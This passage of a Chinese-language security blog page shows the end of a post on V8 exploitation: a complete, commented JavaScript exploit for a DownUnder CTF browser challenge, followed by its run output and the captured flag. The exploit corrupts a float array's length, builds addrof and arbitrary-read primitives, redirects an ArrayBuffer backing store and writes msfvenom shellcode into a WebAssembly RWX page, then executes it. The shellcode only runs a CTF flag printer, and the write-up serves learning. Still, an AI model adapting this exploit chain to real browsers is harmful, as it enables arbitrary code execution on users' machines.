class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/* This challenge is meant to be extremely hard. The way this exploit goes is</span><br><span class="hljs-comment"> * essentially as follows:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Step 1: Read the patch.diff file to figure out the vulnerability</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Step 2: Use the vulnerability to get a corrupted float array. You can use</span><br><span class="hljs-comment"> *         this array to overwrite its own length to a very large number</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Step 3: Once you&#x27;ve done this, exploitation becomes (relatively) easy. There</span><br><span class="hljs-comment"> *         are loads of blog posts and other V8 exploits that you can use as</span><br><span class="hljs-comment"> *         a starting point. I&#x27;ll list some below. The only issue will be that</span><br><span class="hljs-comment"> *         V8 somewhat recently started shipping with pointer compression, and</span><br><span class="hljs-comment"> *         most blog posts / exploits will be made for challenges / vulns from</span><br><span class="hljs-comment"> *         V8 versions without pointer compression.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</span><br><span class="hljs-comment"> * https://blog.exodusintel.com/2019/09/09/patch-gapping-chrome/</span><br><span class="hljs-comment"> * https://tcode2k16.github.io/blog/posts/2020-03-15-confidence-ctf/#chromatic-aberration</span><br><span class="hljs-comment"> * https://blog.hexrabbit.io/2020/03/16/chromatic-aberration-writeup/ (use google translate)</span><br><span class="hljs-comment"> * https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/ (very old)</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If you still have questions regarding this challenge, feel free to DM me </span><br><span class="hljs-comment"> * anywhere. I&#x27;ll do my best to respond to queries!</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Discord: Faith#2563</span><br><span class="hljs-comment"> * Twitter: @farazsth98</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">// Helper functions setup to convert between doubles and numbers when needed</span><br><span class="hljs-keyword">var</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">8</span>);<br><span class="hljs-keyword">var</span> f64_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(buf);<br><span class="hljs-keyword">var</span> u32_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(buf);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ftoi</span>(<span class="hljs-params">val</span>) &#123; <span class="hljs-comment">// typeof(val) == float</span><br>    f64_buf[<span class="hljs-number">0</span>] = val;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">BigInt</span>(u32_buf[<span class="hljs-number">0</span>]) + (<span class="hljs-title class_">BigInt</span>(u32_buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">32n</span>); <span class="hljs-comment">// Watch for little endianness</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">itof</span>(<span class="hljs-params">val</span>) &#123; <span class="hljs-comment">// typeof(val) == BigInt</span><br>    u32_buf[<span class="hljs-number">0</span>] = <span class="hljs-title class_">Number</span>(val &amp; <span class="hljs-number">0xffffffffn</span>);<br>    u32_buf[<span class="hljs-number">1</span>] = <span class="hljs-title class_">Number</span>(val &gt;&gt; <span class="hljs-number">32n</span>);<br>    <span class="hljs-keyword">return</span> f64_buf[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hex</span>(<span class="hljs-params">val</span>) &#123; <span class="hljs-comment">// typeof(val) == BigInt</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0x&quot;</span> + val.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>);<br>&#125;<br><br><span class="hljs-comment">// We set up a web assembly page. This is mapped as an RWX page that we will</span><br><span class="hljs-comment">// later write shellcode into.</span><br><span class="hljs-keyword">var</span> wasm_code = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br><span class="hljs-keyword">var</span> wasm_mod = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasm_code);<br><span class="hljs-keyword">var</span> wasm_instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasm_mod);<br><span class="hljs-keyword">var</span> f = wasm_instance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] WebAssembly RWX page setup!&quot;</span>);<br><br><span class="hljs-comment">// Next, set up three arrays. These will be allocated one after another because</span><br><span class="hljs-comment">// of the deterministic nature of the V8 heap. We corrupt the float array.</span><br><span class="hljs-comment">// You can find their offsets relative to each other using GDB.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// While we do this, we also trigger the vulnerability to get a corrupted</span><br><span class="hljs-comment">// float array in `float_arr`</span><br><span class="hljs-keyword">var</span> float_arr = [<span class="hljs-number">1.1</span>];<br>float_arr = float_arr.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// Trigger the vuln</span><br><span class="hljs-keyword">var</span> addrof_arr = [&#123;&#125;, &#123;&#125;]; <span class="hljs-comment">// Used for the addrof primitive later</span><br><span class="hljs-keyword">var</span> arb_read_arr = [<span class="hljs-number">1.1</span>]; <span class="hljs-comment">// Used for the arbitrary read primitive later</span><br><br><span class="hljs-comment">// We set up an ArrayBuffer and a DataView. We will use these later to write </span><br><span class="hljs-comment">// our shellcode into the RWX page.</span><br><span class="hljs-keyword">var</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-keyword">var</span> dataview = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(buf);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Corrupting float_arr&#x27;s length to 2048&quot;</span>);<br><br><span class="hljs-comment">// We need to store the current `elements` ptr before we corrupt the length</span><br><span class="hljs-comment">// because corrupting the length also requires us to corrupt the `elements` ptr</span><br><span class="hljs-comment">// in the process</span><br><span class="hljs-keyword">var</span> float_arr_elem = <span class="hljs-title function_">ftoi</span>(float_arr[<span class="hljs-number">2</span>]) &amp; <span class="hljs-number">0xffffffffn</span>;<br><br><span class="hljs-comment">// Corrupt the length and keep the `elements` ptr intact</span><br>float_arr[<span class="hljs-number">2</span>] = <span class="hljs-title function_">itof</span>((<span class="hljs-number">0x1000n</span> &lt;&lt; <span class="hljs-number">32n</span>) + float_arr_elem);<br><br><span class="hljs-keyword">if</span> (float_arr.<span class="hljs-property">length</span> === <span class="hljs-number">2048</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Corruption successful!&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[!] Corruption failed. Try again.&quot;</span>);<br>  <span class="hljs-keyword">throw</span> error;<br>&#125;<br><br><span class="hljs-comment">// Setup addrof primitive</span><br><span class="hljs-comment">// Bottom 32 bits of float_arr[4] corresponds to addrof_arr[0]</span><br><span class="hljs-comment">// We simply set addrof_arr[0] to the object whose address we want to leak</span><br><span class="hljs-comment">// Then we read from float_arr[4]</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addrof</span>(<span class="hljs-params">obj</span>) &#123;<br>    addrof_arr[<span class="hljs-number">0</span>] = obj;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">ftoi</span>(float_arr[<span class="hljs-number">4</span>]) &amp; <span class="hljs-number">0xffffffffn</span>;<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Addrof primitive has been setup&quot;</span>);<br><br><span class="hljs-comment">// Setup an arbitrary read primitive for the V8 compressed heap</span><br><span class="hljs-comment">// We do this by overwriting the elements pointer of our arb_read_arr to a</span><br><span class="hljs-comment">// chosen address - 8 (making sure to keep the length set to 0x1000). We</span><br><span class="hljs-comment">// subtract 8 because for any float array, arr[0] == (*elements_ptr + 8).</span><br><span class="hljs-comment">// The elements pointer of arb_read_arr is at float_arr[17], offset found</span><br><span class="hljs-comment">// through GDB.</span><br><span class="hljs-comment">// addr must be a 32-bit value here</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">compressed_arb_read</span>(<span class="hljs-params">addr</span>) &#123;<br>    float_arr[<span class="hljs-number">17</span>] = <span class="hljs-title function_">itof</span>((<span class="hljs-number">0x1000n</span> &lt;&lt; <span class="hljs-number">32n</span>) + addr - <span class="hljs-number">8n</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">ftoi</span>(arb_read_arr[<span class="hljs-number">0</span>]);<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Arbitrary read primitive for the compressed heap has been setup&quot;</span>);<br><br><span class="hljs-comment">// Setup a function that writes our shellcode to a given address</span><br><span class="hljs-comment">// We do this by overwriting the backing store address of the ArrayBuffer we</span><br><span class="hljs-comment">// previously allocated to our chosen address. We then use the DataView that we</span><br><span class="hljs-comment">// also allocated to write our shellcode to that address space.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Using GDB, we find that the backing store address of our ArrayBuffer is</span><br><span class="hljs-comment">// misaligned at float_arr[20] and float_arr[21]. The misalignment is as</span><br><span class="hljs-comment">// follows:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// * The upper 32-bits of float_arr[20] correspond to the lower 32 bits of</span><br><span class="hljs-comment">//   the backing store address</span><br><span class="hljs-comment">// * The lower 32-bits of float_arr[21] correspond to the upper 32 bits of</span><br><span class="hljs-comment">//   the backing store address</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// If this is confusing to you, that&#x27;s because it is very confusing :p I would</span><br><span class="hljs-comment">// suggest looking at this in GDB and comparing whatever I mentioned above to</span><br><span class="hljs-comment">// what you see in GDB until it makes sense</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// addr must be a 64-bit value here</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy_shellcode</span>(<span class="hljs-params">addr, shellcode</span>) &#123;<br>    <span class="hljs-comment">// The backing store address of buf is not aligned to 64 bytes, so we have</span><br>    <span class="hljs-comment">// to write the upper 32-bits and the lower 32-bits of our address to two</span><br>    <span class="hljs-comment">// separate indices like this</span><br>    float_arr[<span class="hljs-number">20</span>] = <span class="hljs-title function_">itof</span>((addr &amp; <span class="hljs-number">0xffffffffn</span>) &lt;&lt; <span class="hljs-number">32n</span>);<br>    float_arr[<span class="hljs-number">21</span>] = <span class="hljs-title function_">itof</span>((addr &amp; <span class="hljs-number">0xffffffff00000000n</span>) &gt;&gt; <span class="hljs-number">32n</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; shellcode.<span class="hljs-property">length</span>; i++) &#123;<br>        dataview.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">4</span>*i, shellcode[i], <span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// msfvenom -p linux/x64/exec CMD=&#x27;./flagprinter&#x27; --format dword</span><br><span class="hljs-keyword">var</span> shellcode = [<span class="hljs-number">0x99583b6a</span>, <span class="hljs-number">0x622fbb48</span>, <span class="hljs-number">0x732f6e69</span>, <span class="hljs-number">0x48530068</span>, <span class="hljs-number">0x2d68e789</span>, <span class="hljs-number">0x48000063</span>, <span class="hljs-number">0xe852e689</span>, <span class="hljs-number">0x0000000e</span>, <br><span class="hljs-number">0x6c662f2e</span>, <span class="hljs-number">0x72706761</span>, <span class="hljs-number">0x65746e69</span>, <span class="hljs-number">0x57560072</span>, <span class="hljs-number">0x0fe68948</span>, <span class="hljs-number">0x00000005</span>];<br><br><span class="hljs-comment">// Now, we leak the address of our RWX page</span><br><span class="hljs-comment">// Using GDB, we know this address is at *(&amp;wasm_instance + 0x68)</span><br><span class="hljs-keyword">var</span> rwx_page_addr = <span class="hljs-title function_">compressed_arb_read</span>(<span class="hljs-title function_">addrof</span>(wasm_instance) + <span class="hljs-number">0x68n</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] RWX page address found: &quot;</span> + <span class="hljs-title function_">hex</span>(rwx_page_addr));<br><br><span class="hljs-comment">// Finally, we copy our shellcode to the RWX page and call the WASM function to</span><br><span class="hljs-comment">// execute it.</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Copying ./flagprinter shellcode to RWX page&quot;</span>);<br><span class="hljs-title function_">copy_shellcode</span>(rwx_page_addr, shellcode);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Printing flag!&quot;</span>);<br><span class="hljs-title function_">f</span>();<br><br></code></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">./d8 --shell ./exploit.js                                                   ✔  00:49:32 <br>[+] WebAssembly RWX page setup!<br>[+] Corrupting float_arr&#x27;s length to 2048<br>[+] Corruption successful!<br>[+] Addrof primitive has been setup<br>[+] Arbitrary read primitive for the compressed heap has been setup<br>[+] RWX page address found: 0xaf5c5019000<br>[+] Copying ./flagprinter shellcode to RWX page<br>[+] Printing flag!<br>DUCTF&#123;y0u_4r3_a_futUR3_br0ws3r_pwn_pr0d1gy!!&#125;<br></code></pre></td></tr></table></figure>



<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div id="footer-link" style="right: calc(50% - 1px);order: 1;border-right: 1px solid #fe2;padding-left: unset;max-width: calc(50% - 4px);"><a href="/2021/03/31/security/fuzz/fuzz-afl/">← Next Binary fuzzing way of american fuzzy lop</a></div><div id="footer-link" style="left: 50%;order: 0;border-left: 1px solid #fe2;padding-right: unset;max-width: calc(50% - 5px);"><a href="/2021/03/30/dev/language/go/go/">Go语言基础 Prev →</a></div></div></div><details id="reward"><summary>打赏点小钱</summary><div id="alipay"><span>支付宝 | Alipay</span><br><img src="/img/Alipay.png"></div><div id="wechat"><span>微信 | WeChat</span><br><img src="/img/WeChat.png"></div></details><div id="Valine"></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="index">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://github.com/i0gan">I0gan</a></h1><div id="description"></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#V8%E5%88%9D%E6%8E%A2"><span class="toc-text">V8初探</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%AF%91-v8"><span class="toc-text">编译 v8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91debug%E7%89%88"><span class="toc-text">编译debug版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91release%E7%89%88"><span class="toc-text">编译release版</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Patch%E6%96%87%E4%BB%B6"><span class="toc-text">Patch文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E6%9C%AB%E5%B0%BE%E5%82%A8%E5%AD%98%E7%9A%84%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">数组末尾储存的是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Downunder-ctf-is-this-pwn-or-web"><span class="toc-text">Downunder ctf [is-this-pwn-or-web]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></div></div></div><footer><nobr><span class="text-title">ICP</span><a class="text-content" target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">沪ICP备2021037250号-1  </a></nobr><nobr><span class="text-title">©</span><span class="text-content">2022 by i0gan</span></nobr><br></footer></aside></main><canvas id="canvas-dust"></canvas><div id="cursor-container"><div id="cursor-outer"></div><div id="cursor-effect"></div></div><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
 el: '#Valine'
 , appId: 'TzNey4n3v0Sx6vdBbytYLoH9-gzGzoHsz'
 , appKey: 'GIXXrK9zLxt0bZLww1hte0Oq' , placeholder: '此条评论委托企鹅物流发送'
});code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="//unpkg.com/@highlightjs/cdn-assets@11.4.0/highlight.min.js"></script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>